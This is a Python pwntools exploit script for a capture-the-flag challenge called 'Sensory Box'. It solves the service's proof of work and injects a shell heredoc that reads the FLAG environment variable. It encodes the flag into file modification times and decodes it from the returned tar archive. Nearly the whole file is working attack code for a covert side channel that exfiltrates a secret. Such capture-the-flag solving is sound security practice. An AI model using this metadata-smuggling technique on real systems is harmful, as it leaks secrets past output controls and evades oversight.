#!/usr/bin/env python3
"""Sensory Box — exploit the tar mtime metadata side channel.

Requires: pip install pwntools
PoW helper: put the archived kctf_pow.py under scripts/vendor/.
Defaults to loopback to prevent accidental contact with a live instance.
This is a documented reproduction of the successful historical method;
the packaged portable variant was not independently rerun.
"""
import argparse
import base64
import io
import lzma
import re
import sys
import tarfile
import time
from pathlib import Path

from pwn import remote, context

sys.path.insert(0, str(Path(__file__).resolve().parent / "vendor"))
import kctf_pow  # type: ignore

context.log_level = "error"

SHELL = b"""python3 - <<'PY'
import os
paths = [f'/boxes/box_{i:02d}/dice.txt' for i in range(1,7)]
paths += [f'/boxes/box_{i:02d}/prize.age' for i in range(1,7)]
f = os.environ['FLAG'].encode()
for i, path in enumerate(paths):
    n = int.from_bytes(f[4*i:4*i+4].ljust(4, b'\\0'), 'big')
    os.utime(path, (0, n))
PY
"""


def decode_bundle(encoded: bytes) -> bytes:
    raw_tar = lzma.decompress(base64.b64decode(b"".join(encoded.split())))
    with tarfile.open(fileobj=io.BytesIO(raw_tar)) as archive:
        mtimes = {m.name: m.mtime for m in archive}
    paths = [f"boxes/box_{i:02d}/dice.txt" for i in range(1, 7)]
    paths += [f"boxes/box_{i:02d}/prize.age" for i in range(1, 7)]
    return b"".join(mtimes[p].to_bytes(4, "big") for p in paths).rstrip(b"\0")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=13377)
    args = ap.parse_args()
    r = remote(args.host, args.port, timeout=20)
    try:
        banner = r.recvuntil(b"Solution? ", timeout=15)
        token = re.search(rb"solve (s\.\S+)", banner)
        if not token:
            raise RuntimeError("kCTF PoW challenge token not found")
        r.sendline(kctf_pow.solve_challenge(token.group(1).decode()).encode())
        r.recvuntil(b"GO!\n", timeout=30)
        r.send(SHELL)
        time.sleep(2.5)
        transcript = b""
        for _ in range(6):
            transcript += r.recvuntil(b"What is your guess? ", timeout=8)
            r.sendline(b"0")
        transcript += r.recvrepeat(4)
        match = re.search(rb"\n([A-Za-z0-9+/=\n]+)\n?$", transcript)
        if not match:
            raise RuntimeError("final bundle missing or integrity check failed")
        result = decode_bundle(match.group(1))
        # Mask in logs: the exact value is kept in the private evidence bundle.
        print("Recovered", len(result), "bytes")
        print("Flag-shaped:", bool(re.fullmatch(rb"gctf\{[^}]+\}", result)))
    finally:
        r.close()


if __name__ == "__main__":
    main()
